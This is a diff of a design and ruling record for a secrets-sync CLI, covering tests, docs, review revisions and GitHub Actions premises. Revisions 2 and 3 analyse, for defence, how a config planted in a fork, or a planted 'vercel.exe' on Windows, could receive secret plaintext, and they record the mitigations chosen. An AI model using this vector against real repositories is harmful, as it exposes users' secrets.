-`--workflow`)、`message-style.test.ts`、`redacted.test.ts` の棚卸し表(**変更なし** — sync-push.ts は `Redacted.make` だけ)、
-fallow(`parseWorkflow` の CRAP を `workflowRecord` / `ghArgument` に分けて 30 以下に。`parseSyncConfig` の cognitive を
-`parseTargets` に分けて閾値内。未使用 export は非公開に)。
+**I. Tests** — `test/sync-push.test.ts` (new. `sync-command.test.ts`'s basis = `makeValueEnvironmentServer` + fake `ProcessRunner`)'s 19 cases: push → direct apply → the receipt advances (ordering, no unchanged lines, vendor called once, stdin = the new value, no value on argv) / cwd default path (`process.chdir`) / `--no-sync` (vendor 0, zero requests to the receipt environment) / no config / explicit `project` mismatch = 2, push never sent / default-path `project` mismatch = 0 + note / broken default path = 1, push never sent / non-sync-source environment, non-carried variable, no onPush = nothing (a note if explicit) / production + `"apply"` = a config error / vendor failure = warning, 0, receipt kept as-is, next plan shows pending / start failure = warning, 0 / uncarriable value (trailing newline) = warning, zero sends / evidence (value-version rollback) = 1, `Pushed` already printed / `gh workflow run`'s argv, cwd, env, empty stdin, no values or variable names, zero requests to the receipt environment / no `--ref` + `command` override / gh's 4 = not logged in / gh nonzero = output tail + guidance (control characters neutralized) / gh absent / multiple targets (apply + workflow) where one failure doesn't stop the rest. `sync-units.test.ts` gains `onPush` parsing (4 accepted forms, 10 rejected forms, the `project` requirement); `sync-init.test.ts` gains `--on-push` round trip (+ `project` absent = 2, production + apply = 2). `--help` golden (`push` gets `--config` / `--no-sync`, `sync init` gets `--on-push` / `--workflow`), `message-style.test.ts`, `redacted.test.ts`'s inventory table (**unchanged** — sync-push.ts only uses `Redacted.make`), fallow (`parseWorkflow`'s CRAP split into `workflowRecord` / `ghArgument` to fit ≤ 30. `parseSyncConfig`'s cognitive split into `parseTargets` to fit the threshold. Unused exports made private).
 
-**J. docs** — `deploy-targets.mdx`: 「How maruhi sync works」に 1 点、「The config file」の表に `onPush` / `workflow` の行(`project` の
-行に「`onPush` があれば必須」)、新節「Sync on push」(2 つの形・production の扱い・設定の探索・失敗時の回収・`--no-sync`・起動先の
-契約 = `workflow_dispatch` + `target` 入力の YAML 断片・`--ref` の既定・テンプレートは planned)、「Receipts」の 2 点目・「In CI」の
-末尾・「Vendor CLI telemetry」に gh。index / README は `maruhi sync` の紹介のみで変更不要。
+**J. docs** — `deploy-targets.mdx`: one point in "How maruhi sync works", `onPush` / `workflow` rows in "The config file" table (the `project` row gains "required when `onPush` is present"), a new section "Sync on push" (the 2 forms, production's handling, config discovery, failure collection, `--no-sync`, the trigger contract = `workflow_dispatch` + `target` input as a YAML fragment, `--ref`'s default, the template is planned), "Receipts" point 2, the tail of "In CI", gh in "Vendor CLI telemetry". index / README only introduce `maruhi sync` — no change needed.
 
-**K. ROADMAP と裁定録** — SY2 行の第 3 段を完了注記へ(日付・PR 番号・裁定の要約)にし、**SY2 全体を完了**(`- [x]`)。SY3 行の
-② を「書き手からの CI 起動は第 3 段で実装済み。起動先の契約 = …。docs は契約だけ、テンプレートは SY3」に、SY6 の降格理由に
-「第 3 段で実装済み」を添える(降格理由は第 3 段が実装されて初めて成立する)。本節を 2b の末尾に追記。
+**K. ROADMAP and ruling record** — SY2 row's stage 3 becomes a completion note (date, PR number, ruling summary), and **SY2 as a whole is marked complete** (`- [x]`). SY3 row's ② becomes "CI triggering from the writer is implemented in stage 3. The trigger contract = …. docs covers only the contract; the template is SY3", and SY6's demotion reason gains "implemented in stage 3" (the demotion reason only holds once stage 3 is implemented). This section is appended to 2b's tail.
 
-**不変条件の確認**: 仕様改訂なし(暗号操作の追加なし。直接 apply は既存の `syncApplyOp`、CI 起動は値の無い子プロセス。チェーン・
-wire・サーバー・Web・`packages/crypto` は無変更)/ 平文は書き手の CLI か CI の中だけ(`gh workflow run` の argv は設定由来の
-ターゲット名と workflow 名だけ・stdin 空。剥がす場所は増えない — 棚卸し表は据え置き)/ production は自動で書かない(`"apply"` は
-設定で拒む。CI 起動は書く行為ではなく、書く決定は workflow の `--yes`)/ 一方通行(同期先を読み戻さない・CI の結果を待たない・
-ポーリングしない)/ 失敗の方向(後始末の通信・権限・ベンダー / gh の失敗は警告・終了コード不変。証拠だけ失敗。`Pushed` と提案は
-先に出る。設定の不備と明示の不一致は push の**前**に落とす)/ ディスクレス(永続化は非機密の設定だけ。debounce の印は作らない)/
-ADR-0016(型付きエラー・stdout はコマンドの出力だけ・通知は notice.ts・`process.*` は live.ts のみ・新フラグは決定 5 の範囲・
-golden / message-style)/ 英語 / 依存ゼロ(`gh` は導入済みだけ・`npx` なし)/ エージェント環境の新しいゲート無し(裁定 H)/
-スコープ(SY3 のテンプレート・SY4・SY5・SY6・`--all`・Vercel の一覧の続きは取り込まない)。
+**Invariant check**: no spec revision (no crypto operations added. Direct apply is the existing `syncApplyOp`; CI triggering is a value-less child process. Chain / wire / server / web / `packages/crypto` unchanged) / plaintext lives only inside the writer's CLI or CI (`gh workflow run`'s argv is just the config-derived target name and workflow name; stdin empty. No new unwrap site — the inventory table stays) / production is never written automatically (`"apply"` is refused at the config level. CI triggering isn't the act of writing; the decision to write lives in the workflow's `--yes`) / one-way (never reads back the destination, doesn't wait for CI's result, doesn't poll) / failure direction (cleanup's communication / permission / vendor / gh failures = warnings, exit code unchanged. Only evidence fails. `Pushed` and the proposal print first. Config faults and explicit mismatches fail **before** the push) / diskless (only non-secret config is persisted. No debounce marker is made) / ADR-0016 (typed errors, stdout is only the command's output, notifications via notice.ts, `process.*` only in live.ts, new flags within decision 5's scope, golden / message-style) / English / zero dependencies (`gh` only if installed; no `npx`) / no new agent-environment gates (ruling H) / scope (SY3's template, SY4, SY5, SY6, `--all`, the rest of Vercel's listing not pulled in).
 
-**改訂 1(2026-09-08、pullfrog の初回レビュー〔f7f667d〕)**: (1) `applyTarget` が統合トークンの環境の床ハンドルをターゲット
-ごとに `floorHandleFor` で開き直していた — 同じ同期元の 2 つの http ターゲットが 1 つのトークン環境を共有すると、2 つ目が
-push 前の床のスナップショットから始まり、1 つ目のトークン pull で前進した床を知らない(裁定 D の「`openSyncTarget` と同じ
-規則」はループを想定していなかった)→ 1 回の push で環境ごとに床ハンドルを 1 つだけ持つ台帳(`floorLedger` — 同期元 = push の
-ハンドルで初期化し、レシート環境・トークン環境は初回に開いて以後は同じもの)。(2) `--no-sync` が明示の `--config` に黙って勝ち、
-指した設定を読まずに済ませていた → 併用は書き方の誤り(2)。裁定 E を改める。(3) 新規の名前の初回 push(plan が `+`)の態が
-無かった → `GAMMA` の push(値は 1 回だけ stdin へ・レシートに version 1)を追加。(4) テストの生の ESC バイトを `\u001b` に。
+**Revision 1 (2026-09-08, pullfrog's first review〔f7f667d〕)**: (1) `applyTarget` was re-opening the integration-token environment's floor handle via `floorHandleFor` per target — when 2 http targets of the same sync source share one token environment, the second starts from the pre-push floor snapshot, not knowing the floor advanced by the first's token pull (ruling D's "same rule as `openSyncTarget`" hadn't anticipated the loop) → one push now holds a ledger with one floor handle per environment (`floorLedger` — initialized with the sync source = push's handle; the receipt environment and token environment are opened on first use and reused thereafter). (2) `--no-sync` was silently beating an explicit `--config`, letting it pass without reading the pointed config → combining them is a usage error (2). Ruling E revised. (3) There was no case for first-push of a new name (plan shows `+`) → added a `GAMMA` push (value to stdin once; receipt gets version 1). (4) Raw ESC bytes in tests became `\u001b`.
 
-**改訂 2(2026-09-08、pullfrog の再レビュー〔6fd9b5d〕)**: (1) 設計の指摘 — `onPush` により、同期の意図の無い `maruhi push` が cwd で
-見つけた `maruhi.sync.json` の名指しする**実行体**(exec の `command` / `workflow.command`)を起動し、平文を stdin で渡す形が
-できた。関門はプロジェクト ID の一致だが、設定はリポジトリにコミットされるので公開リポジトリではプロジェクト ID は公開情報で、
-「fork に置かれた設定 + `cd` してからの日常の push」で成立する。`sync apply` も既定パスを読むが、そちらは利用者が同期を打つ
-(`Running … in …` を見る)。候補: (A) 現状維持 + docs の 1 文 / (B) **既定パスの設定は実行体を名指しできない**(名指しする
-ターゲットは note で飛ばし、`--config` 明示 = 利用者がそのファイルを指す動作でだけ動く。プリセットの既定 = PATH 上の
-`vercel` / `wrangler` / `gh` は動く)/ (C) 既定パスの探索をやめる(裁定 B の (a) — 第 3 段の目的を解かない)。第 1 周の新案:
-`cwd` の上書きも拒む案(なし — `cwd` は実行体を変えない〔PATH 探索〕。変わるのはベンダー CLI が解決する同期先で、それは手で
-その dir で打つのと同じ。fork の `.vercel/project.json` が別プロジェクトを指しても、書き手のログインで書ける先は書き手の
-プロジェクトだけ)。`node_modules/.bin/…` を例外にする案(なし — 判定が曖昧になる。fork に `bun install` した時点で postinstall に
-既に負けているので例外を作る意味も薄い)。第 2 周(壊れ方): (B) は docs が勧める `node_modules/.bin/wrangler` の利用者に既定
-パスの自動同期を与えない(`--config` を毎回、または PATH に載せる)— 安全側の代償として受容し、docs に書く。(A) は平文の
-持ち出し経路を「cwd に入ること」だけで作る(なし)。**選定 = (B)**。`decidePushSync` が既定パスのとき名指しのターゲットを
-`namesCommand` に分け、`syncAfterPush` が note(`target X names the program to run …; pass --config … or run \`maruhi sync apply
-X\``)を出して飛ばす。態を追加(既定パス: 名指しの 2 ターゲットは動かず note・名指し無しの 1 つは動く / 明示: 名指しも動く)。
-(2) docs の「says nothing」を明示 `--config` の note に合わせて訂正。(3) env.ts の errors.ts の import を 1 文に。
+**Revision 2 (2026-09-08, pullfrog's re-review〔6fd9b5d〕)**: (1) a design-level point — via `onPush`, an unintended `maruhi push` can launch the **executable** named by a `maruhi.sync.json` found in cwd (exec's `command` / `workflow.command`), receiving plaintext on stdin. The gate is project-ID matching, but since the config is committed to the repo the project ID is public information in a public repo, and "a config placed on a fork + routine pushes after `cd`" satisfies it. `sync apply` also reads the default path, but there the user initiates the sync (they see `Running … in …`). Candidates: (A) keep as-is + one docs line / (B) **a default-path config can't name the executable** (targets that name one are skipped with a note; they only run under explicit `--config` = the act of the user pointing at that file. Preset defaults = `vercel` / `wrangler` / `gh` on PATH still work) / (C) abandon default-path discovery (ruling B's (a) — doesn't solve stage 3's purpose). Round-1 new option: also refuse the `cwd` override (no — `cwd` doesn't change the executable〔PATH lookup〕. What changes is the destination the vendor CLI resolves, which is the same as running it by hand in that dir. Even if a fork's `.vercel/project.json` points at another project, what the writer's login can write is only the writer's project). Making `node_modules/.bin/…` an exception (no — the judgment gets murky. And once you `bun install` a fork, postinstall has already beaten you, so an exception is toothless). Round 2 (failure modes): (B) doesn't give default-path auto-sync to the `node_modules/.bin/wrangler` users docs recommends (they'd pass `--config` every time or put it on PATH) — accepted as the price of the safe side; documented. (A) creates a plaintext-exfiltration route from "merely being in cwd" (no). **Chosen = (B)**. When `decidePushSync` sees the default path, targets that name an executable are split into `namesCommand`, and `syncAfterPush` emits a note (`target X names the program to run …; pass --config … or run \`maruhi sync apply X\``) and skips them. Cases added (default path: the 2 named targets don't run and note, the 1 unnamed one runs / explicit: named ones run too). (2) docs' "says nothing" corrected to match the explicit-`--config` note. (3) env.ts's errors.ts import made one line.
 
-**改訂 3(2026-09-08、pullfrog の差分レビュー〔9fdbc55〕)**: (1) 「名指し」の判定を文字列比較(exec: `command !== spec.command` /
-workflow: `command !== "gh"`)で行っていた — 既定の綴り `"gh"` を sync-push.ts が写しており、解析側の既定が変われば全 workflow
-ターゲットが黙って「名指し」になる(既定パスの workflow ターゲットが gh を起動する態が無く、検出できない)。加えて明示の
-`"command": "vercel"` を名指しでない扱いにしていた → **解析時に `namedCommand: boolean`(設定が `command` / `workflow.command` を
-書いた事実)を持ち**、sync-push.ts はそれを読む。既定の綴りを書いても名指し(設定が実行体を書いた事実で判定する — 綴りの一致で
-免除しない)。態を追加(既定パス: `"command": "vercel"` は飛ばす・`workflow.command` 無しの workflow ターゲットは PATH 上の gh で
-起動する)。(2) note の文面: 既に push は済んでいるので「Pass --config … to sync it after this push」は成り立たない → 「Run
-`maruhi sync apply X` now, or pass --config … on the next push」。(3) **検証の穴の申告**: 改訂 2 の「`cwd` は実行体を変えない
-(PATH 探索)」は Linux で確かめた事実(本セッション: Bun 1.4.0 の `Bun.spawn({ cmd: ["vercel"], cwd })` は cwd に実行可能な
-`vercel` があっても PATH に無ければ ENOENT。pullfrog も Bun 1.4.2 で同じ結果)で、**Windows は未確認**(Bun は Windows で別の
-解決経路〔`PATHEXT`〕を持ち、`windows-x64` は配布対象)。Windows が cwd を探索するなら、fork に置かれた `vercel.exe` が既定パスの
-設定から平文を受け取る。人間タスクに追加(Windows で `command` 無しのターゲット + 設定ディレクトリの `vercel.exe` で PATH 側が
-動くことの確認)。cwd を探索すると分かれば、既定パスでは「解決済み `cwd` がプロセスの cwd と違うターゲットも名指し扱い」でなく、
-**既定パスの exec ターゲットを Windows では動かさない**方向で閉じる(実行体の解決規則に依存しない形 — 判定材料は `Stdio` 等の
-サービス経由で取る)。
+**Revision 3 (2026-09-08, pullfrog's diff review〔9fdbc55〕)**: (1) the "names it" judgment was a string comparison (exec: `command !== spec.command` / workflow: `command !== "gh"`) — the default spelling `"gh"` was transcribed into sync-push.ts, so if the parse-side default changed, every workflow target would silently become "named" (there was no case of a default-path workflow target launching gh, so it wouldn't be detected). Also an explicit `"command": "vercel"` was being treated as not naming → **parse-time `namedCommand: boolean` (the fact the config wrote `command` / `workflow.command`) is now held**, and sync-push.ts reads it. Even writing the default spelling counts as naming (judged by the fact the config wrote an executable — not exempted by spelling equality). Cases added (default path: `"command": "vercel"` is skipped; a `workflow.command`-less workflow target launches gh from PATH). (2) The note's wording: since the push already happened, "Pass --config … to sync it after this push" doesn't hold → "Run `maruhi sync apply X` now, or pass --config … on the next push". (3) **A declared verification gap**: revision 2's "`cwd` doesn't change the executable (PATH lookup)" was a fact verified on Linux (this session: Bun 1.4.0's `Bun.spawn({ cmd: ["vercel"], cwd })` gives ENOENT when `vercel` exists in cwd but not on PATH. pullfrog got the same result on Bun 1.4.2), but **Windows is unverified** (Bun has a different resolution path〔`PATHEXT`〕on Windows, and `windows-x64` is a distribution target). If Windows searches cwd, a `vercel.exe` placed on a fork receives plaintext from a default-path config. Added to human tasks (confirm on Windows that a `command`-less target + a `vercel.exe` in the config directory still resolves PATH-side). If cwd is found to be searched, the closure direction is not "also count targets whose resolved `cwd` differs from the process's cwd as named on the default path" but **don't run default-path exec targets on Windows at all** (a shape independent of executable-resolution rules — the determination materials are taken via services like `Stdio`).
 
-**第 3 段以降への申し送り(SY2 完了)**: (1) **SY3** = workflow テンプレート 2 標準形 + 四眼の docs。第 3 段の `onPush: "workflow"`
-の起動先は「`workflow_dispatch` + `target` 入力 + `maruhi ci sync ${{ inputs.target }} --yes`」の契約を満たす workflow で、docs
-「Sync on push」の YAML 断片がその契約。標準形 ②(Vercel)のテンプレートは `workflow_dispatch`(第 3 段からの起動)と `schedule`
-(定期突合)の両方の trigger を持つ 1 ファイルにできる。(2) 全ターゲット一括の plan(`--all`)。(3) SY4 Netlify(http プリセットの
-宣言 1 つ + モック)。(4) SY5 gh プリセット(`gh secret set` — 第 3 段の `GH_ENV` と `ghArgument` は流用できる)。(5) `sync plan` /
-`push` の既定パス探索を git ルートまで遡る案(裁定 B (d))は需要が出たら両方同時に。(6) debounce(裁定 E (iii))は需要が出たら
-再裁定(名前も値も持たない印の形を先に)。(7) 人間タスク(未消化 — 本 PR で追加: `gh workflow run` の実機での通し〔既定ブランチ
-の workflow 不在・`workflow_dispatch` 不在・未ログインの各文面〕、**Windows での実行体の解決**〔改訂 3 (3)〕): 実アカウント(Cloudflare / Vercel)での http / `ci sync` の通し、
-Vercel の一覧がページ分けされる条件の実測、macOS のパイプ容量、`vercel env rm` の不在名の終了コード、文言の好み。
+**Handoff to post-stage-3 (SY2 complete)**: (1) **SY3** = workflow template's 2 standard forms + four-eyes docs. The stage-3 `onPush: "workflow"` target is a workflow satisfying the contract "`workflow_dispatch` + `target` input + `maruhi ci sync ${{ inputs.target }} --yes`"; docs "Sync on push"'s YAML fragment is that contract. Standard form ② (Vercel)'s template can be one file with both `workflow_dispatch` (triggered from stage 3) and `schedule` (periodic check) triggers. (2) All-target plan (`--all`). (3) SY4 Netlify (one http-preset declaration + a mock). (4) SY5 gh preset (`gh secret set` — stage 3's `GH_ENV` and `ghArgument` are reusable). (5) The "ascend to git root" option for `sync plan` / `push`'s default-path discovery (ruling B (d)) — when demand appears, do both at once. (6) Debounce (ruling E (iii)) — re-rule when demand appears (a marker shape holding neither names nor values first). (7) Human tasks (carried over — added in this PR: `gh workflow run` on a real machine〔each wording: workflow absent on the default branch, `workflow_dispatch` absent, not logged in〕, **executable resolution on Windows**〔revision 3 (3)〕): end-to-end runs of http / `ci sync` on real accounts (Cloudflare / Vercel), measuring when Vercel paginates its listing, macOS pipe capacity, `vercel env rm`'s missing-name exit code, wording preferences.
 
-### SY3 実装時の裁定録(2026-09-08)
+### SY3 implementation-time ruling record (2026-09-08)
 
-対象は ROADMAP **SY3** = CI から同期(案 S3)の残り = **workflow テンプレート 2 標準形 + 四眼(GitHub Environments の required
-reviewers)の docs**。コマンド(`maruhi ci sync` — 第 2 段 2a、`onPush: "workflow"` — 第 3 段)は揃っており、**CLI のコード変更は
-ない**。設計は §3 冒頭「同期の最終形」の表(「2 つの家族」の行)と補足 7 P1 / P3・補足 8 Q2 / Q3・補足 15 X4 が正で、蒸し返して
-いない。出発点は第 3 段の申し送り (1)(起動先の契約 = 「`workflow_dispatch` + `target` 入力 + `maruhi ci sync ${{ inputs.target }}
---yes`」、標準形 ② は `workflow_dispatch` と `schedule` を 1 ファイルに)。各裁定点は同じループ(3 案以上 → 上位互換の探索 →
-新案が出ない周で終了 → 理由付きで選定)で決め、「新案なし」の周では壊れ方(多重実行・fork・既定ブランチ以外の設定・承認待ちの
-間の push・古いアンカー・リースポリシーの claim と Environment の対応・権限の境界)を問うた。
+The target is ROADMAP **SY3** = the remainder of syncing from CI (option S3) = **the workflow template's 2 standard forms + four-eyes docs (GitHub Environments' required reviewers)**. The commands (`maruhi ci sync` — stage 2a, `onPush: "workflow"` — stage 3) are already in place, so **the CLI code change is
+none**. The design's sources of truth are §3's head "final form of sync" table (the "two families" row), supplements 7 P1 / P3, 8 Q2 / Q3, and 15 X4; not re-litigated. The starting point is stage 3's handoff (1) (the trigger contract = "`workflow_dispatch` + `target` input + `maruhi ci sync ${{ inputs.target }} --yes`"; standard form ② puts `workflow_dispatch` and `schedule` in one file). Each ruling point was decided by the same loop (3+ options → search for a superset → end on a no-new-option round → choose with reasons), and on "no new option" rounds we asked about failure modes (double runs, forks, config on a non-default branch, pushes during approval waits, stale anchors, correspondence between lease-policy claims and Environments, permission boundaries).
 
-**前提の確認(実物・公式 docs で確かめた事実。日付はすべて 2026-09-08)**:
-(1) **GitHub Actions の OIDC claim**(docs.github.com「OpenID Connect reference」): `environment` = 「The name of the environment used
-by the job. If the environment claim is included, an environment is required and must be provided」= **job が `environment:` を持つ
-ときだけ載る**。`repository` = 「The repository from where the workflow is running」(fork の自前 run は fork の名前)。`ref` は
-起動した git ref(`workflow_dispatch` = 叩いた ref、PR は `refs/pull/<n>/merge`)。`workflow_ref` = 「`octocat/hello-world/.github/
-workflows/my-workflow.yml@refs/heads/my_branch`」。**`sub` の既定形式は 2026-07-15 以降に作られたリポジトリで
-`repo:OWNER@OWNER-ID/REPO@REPO-ID:…` に変わった**(既存は旧形式のまま・opt-in で移行)= `sub` を制約に使うとリポジトリの作成日で
-値が変わる → docs で「`sub` は制約しない」。
-(2) **Environments**(「Managing environments for deployment」/「Deployments and environments」): required reviewers は 6 人 / チーム
-まで・**1 人の承認で進む**・reviewer は read 以上・**Prevent self-review**(起動者は自分の run を承認できない)・reject で run は
-失敗・**Free / Pro / Team プランでは public リポジトリのみ**・設定は personal repo = owner、org repo = admin。「Running a workflow
-that references an environment that does not exist will create an environment with the referenced name」(保護規則なしで自動作成)。
-Environment を削除すると待機中の job は失敗。deployment branches で参照できる ref を絞れる。**承認待ちの上限日数は docs に無い**
-(wait timer の上限 30 日とは別)→ 書かない。
-(3) **concurrency**(「Control the concurrency of workflows and jobs」/ workflow-syntax): job レベルの `concurrency.group` の式は
-「`github`, `inputs`, `vars`, `needs`, `strategy`, and `matrix`」を使える(workflow レベルは `github` / `inputs` / `vars` のみ)。
-`environment.name` の式も同じ 6 コンテキスト。既定(`queue: single`)= **pending は 1 つだけ**で、新しい queued が古い pending を
-取って代わる(`cancel-in-progress: false` でも)。`queue: max` で 100 まで並ぶ。FIFO は「waiting を始めた時刻」順で保証なし。
-(4) **workflow_dispatch / schedule**(「Events that trigger workflows」/「Manually run a workflow」): 叩けるのは **write 権限**、
-workflow ファイルは**既定ブランチ**に要る(第 3 段の前提 (3) と一致)。`inputs` は 25 個まで。`schedule` は最短 5 分・UTC(timezone
-指定可)・**既定ブランチの最新コミットで走る**・public リポジトリで 60 日活動が無いと自動停止・高負荷時は遅れる。fork: 「typically
-you can't grant write access」(fork からの PR の job は `id-token: write` を得られない = OIDC エンドポイントが出ない → `maruhi ci
-run` は「endpoint is not available」で止まる。fork の**自前**の dispatch / schedule は fork の `repository` claim で走り、ポリシーに
-合わない = 404)。
-(5) **maruhi 側**: `grant_server` は**サーバー鍵ごとに 1 つ**で、再 grant で lease_policy は自由に差し替え・開示スコープは拡大のみ
-(CRYPTO_SPEC §6.3 再 grant 規則の二層化)。認可は**存在量化**(AUTH_SPEC §14-1: 要素のどれかが全制約で一致すれば認可)で、
-**要素と環境の対応は無い** = ある要素に合致した job は開示スコープ内の**全環境**を借りられる。この事実が裁定 D / F の「四眼を
-maruhi 側でも強制する」条件を決める(下記)。`ciSyncOp`(sync-ci.ts)は同期元(+ http でトークンが別環境ならその環境)を
-`leaseEnvironments` で 1 本のトークン・1 つの一時鍵で借り、`receipt: null` で全件 add・削除なし・`requireProductionConsent` で
-production の `--yes` を要求(無ければ plan を出して型付きエラー = 非 0)。`ci run` は子に `MARUHI_*` を渡さず、それ以外の親環境
-(`ACTIONS_ID_TOKEN_REQUEST_*` を含む)は継承する(run.ts `buildChildEnvironment`)。**アンカー**(anchor.ts): 検査は「genesis 一致・
-チェーンがアンカーのヘッドを含む・環境エポックがアンカー以上」= **アンカーが古い(ローテーション後に未更新)のは受理される
-(床が低いだけ)**。本セッションの依頼文の「アンカーが古い = `ci sync` が拒む」は逆で、docs は実物どおり「古いアンカーは通るが
-その分だけ弱い。ローテーション後に更新する」と書いた。リースの窓は `MAX_LEASES_PER_WINDOW = 300` / 時(プロジェクト単位 —
-policy.ts)。http ドライバの Workers は Worker 不在(10007 / 10090)で draft を作らず案内する(sync-http.ts)。
-(6) **Bun 1.4.0 に `Bun.YAML.parse` がある**(実測: `bun -e 'Bun.YAML.parse(…)'`)。vitest は Node で走るが、リポジトリは
-`.bun-version` で Bun を要求し、recipes.test.ts の偽コマンドも `exec bun` で動いている = **YAML パーサを依存追加なしで使える**
-(裁定 H の銀の弾丸)。`node_modules/.bun` に `yaml@2.8.3` / `js-yaml` は推移的にあるが直接 import は依存追加。
-(7) タグは `v0.1.0-rc.1` / `v0.1.0-rc.2` のみで、**`actions/setup-maruhi` を含むリリースタグはまだ無い**(action の README が
-「tags up to v0.1.0-rc.2 predate it」と言うとおり)→ テンプレートの `@<tag>` / `version: <tag>` はプレースホルダのまま。
+**Premise verification (facts confirmed against the real things / official docs. All dates 2026-09-08)**:
+(1) **GitHub Actions OIDC claims** (docs.github.com "OpenID Connect reference"): `environment` = "The name of the environment used by the job. If the environment claim is included, an environment is required and must be provided" = **carried only when the job has `environment:`**. `repository` = "The repository from where the workflow is running" (a fork's own run carries the fork's name). `ref` is the git ref that fired it (`workflow_dispatch` = the ref that was hit; PR = `refs/pull/<n>/merge`). `workflow_ref` = "`octocat/hello-world/.github/workflows/my-workflow.yml@refs/heads/my_branch`". **`sub`'s default format changed for repos created after 2026-07-15 to `repo:OWNER@OWNER-ID/REPO@REPO-ID:…`** (existing repos keep the old form; opt-in migration) = using `sub` as a constraint makes the value depend on the repo's creation date → docs say "don't constrain `sub`".
+(2) **Environments** ("Managing environments for deployment" / "Deployments and environments"): required reviewers up to 6 people / teams; **one approver lets it proceed**; reviewers need read or above; **Prevent self-review** (the dispatcher can't approve their own run); a reject fails the run; **on Free / Pro / Team plans only for public repos**; configured by the owner on personal repos, by admins on org repos. "Running a workflow that references an environment that does not exist will create an environment with the referenced name" (auto-created with no protection rules). Deleting an Environment fails its waiting jobs. deployment branches can restrict referable refs. **The cap on approval-wait days isn't in the docs** (separate from the wait timer's 30-day cap) → not written.
+(3) **concurrency** ("Control the concurrency of workflows and jobs" / workflow-syntax): a job-level `concurrency.group` expression can use "`github`, `inputs`, `vars`, `needs`, `strategy`, and `matrix`" (workflow-level: `github` / `inputs` / `vars` only). `environment.name` expressions get the same 6 contexts. The default (`queue: single`) = **only 1 pending**, and a new queued run replaces an old pending (even with `cancel-in-progress: false`). `queue: max` queues up to 100. FIFO is "when waiting began" order, not guaranteed.
+(4) **workflow_dispatch / schedule** ("Events that trigger workflows" / "Manually run a workflow"): dispatchable with **write permission**; the workflow file must be on the **default branch** (matches stage 3's premise (3)). Up to 25 `inputs`. `schedule` is minimum 5 minutes, UTC (timezone specifiable), **runs on the default branch's latest commit**, auto-stops after 60 inactive days on public repos, may be delayed under load. Forks: "typically you can't grant write access" (jobs in a PR from a fork can't get `id-token: write` = no OIDC endpoint → `maruhi ci run` stops with "endpoint is not available". A fork's **own** dispatch / schedule runs with the fork's `repository` claim, doesn't match the policy = 404).
+(5) **maruhi's side**: `grant_server` is **one per server key**; re-grant freely swaps lease_policy while the disclosure scope can only widen (CRYPTO_SPEC §6.3 re-grant two-layering). Authorization is **existential** (AUTH_SPEC §14-1: authorized if any element matches all constraints), and **there's no element↔environment correspondence** = a job matching one element can lease **every environment** in the disclosure scope. This fact determines rulings D / F's "enforce four-eyes on the maruhi side too" conditions (below). `ciSyncOp` (sync-ci.ts) leases the sync source (plus, under http, the token's environment if separate) via `leaseEnvironments` under one token and one ephemeral key; `receipt: null` makes it all-add, no deletes; `requireProductionConsent` requires production's `--yes` (otherwise it prints a plan and fails with a typed error = nonzero). `ci run` passes no `MARUHI_*` to the child; other parent env (including `ACTIONS_ID_TOKEN_REQUEST_*`) is inherited (run.ts `buildChildEnvironment`). **The anchor** (anchor.ts): the check is "genesis matches, the chain contains the anchor's head, the environment epoch is ≥ the anchor's" = **a stale anchor (unupdated post-rotation) is accepted (just a lower floor)**. This session's request's "stale anchor = `ci sync` refuses" was backwards; docs were written per reality: "a stale anchor passes but is weaker by that much; update it after rotation". The lease window is `MAX_LEASES_PER_WINDOW = 300` / hour (per project — policy.ts). The http driver's Workers path guides instead of creating a draft on missing Worker (10007 / 10090) (sync-http.ts).
+(6) **Bun 1.4.0 has `Bun.YAML.parse`** (measured: `bun -e 'Bun.YAML.parse(…)'`). vitest runs on Node, but the repo requires Bun via `.bun-version`, and recipes.test.ts's fake commands run via `exec bun` = **a YAML parser is usable with zero dependency additions** (ruling H's silver bullet). `node_modules/.bun` transitively has `yaml@2.8.3` / `js-yaml`, but direct import = adding a dependency.
+(7) The only tags are `v0.1.0-rc.1` / `v0.1.0-rc.2`; **there is not yet a release tag containing `actions/setup-maruhi`** (as the action's README says, "tags up to v0.1.0-rc.2 predate it") → the templates' `@<tag>` / `version: <tag>` stay as placeholders.
 
-**標準形 × ドライバ × ターゲット × trigger × 失敗(裁定 B〜D・G の入力)**:
+**Standard form × driver × target × trigger × failure (input to rulings B–D, G)**:
 
-| 標準形 | ドライバ | ターゲット | trigger | 平文の行き先 | GitHub secrets | 失敗 |
+| Standard form | Driver | Target | trigger | Plaintext destination | GitHub secrets | Failures |
 |---|---|---|---|---|---|---|
-| ① デプロイ時再適用 | http(標準) | production(Workers) | `push` to main(+ Environment `production`) | `ci sync` → API 本文、`ci run` → wrangler の env | **空**(`CLOUDFLARE_API_TOKEN` / `ACCOUNT_ID` は maruhi の `tokens`) | Worker 不在 = 10007 で停止(初回は deploy が先)・リース 404 = ポリシー / Environment・ベンダー失敗 = 非 0・次回全件再適用 |
-| ① | exec(代替・prose のみ) | 同上 | 同上 | wrangler の stdin | `CLOUDFLARE_API_TOKEN` が GitHub secret | draft は作られる(bootstrap 不要)・トークンは GitHub に残る |
-| ① | SY1 レシピ(代替・prose のみ) | 同上 | 同上 | jq → wrangler の stdin | 同上 | 設定もレシートも無い |
-| ② 起動 + 定期 | http(標準) | production(Vercel `web`。Environment `web`) | `workflow_dispatch`(`maruhi push` / 人)| `ci sync` → API 本文 | 空(`VERCEL_TOKEN` は maruhi の `tokens`) | 不在ターゲット = `targets` job で停止(Environment を作らない)・404 = ポリシー・多重 = concurrency で直列(pending は最新 1 つ) |
-| ② | http | production | `schedule` | 同上 | 空 | **required reviewers があれば毎回承認待ち**(docs で明示。`SCHEDULED_TARGETS` から外せる)|
-| ② | http | 非 production(`preview` を CI で同期する場合) | 両方 | 同上 | 空 | ポリシー要素が 1 つ増え、その job 同一性は production も借りられる(前提 (5))→ docs の「2 つの限界」の 1 つ目 |
-| ② | exec(手元の `onPush: "apply"`) | 非 production(`preview`) | push 時に手元 | vercel CLI の stdin(手元) | — | CI は関与しない = `SCHEDULED_TARGETS` に載せない(載せれば 404)|
-| 共通 | — | — | fork からの PR | — | — | `id-token: write` を得られず OIDC 端点が無い = `maruhi ci run` が止まる。fork 自前の run は `repository` 不一致 = 404 |
-| 共通 | — | — | 既定ブランチ以外に置いた設定 / workflow | — | — | `gh` は既定ブランチを叩く = 新ターゲットはマージまで存在しない(`targets` job の名指しで止まる)|
-| 共通 | — | — | 承認待ちの間の push | — | — | 待機 run は**実行時点**の現在値を書く(古い値は書かない)。新しい queued が古い pending を置き換える |
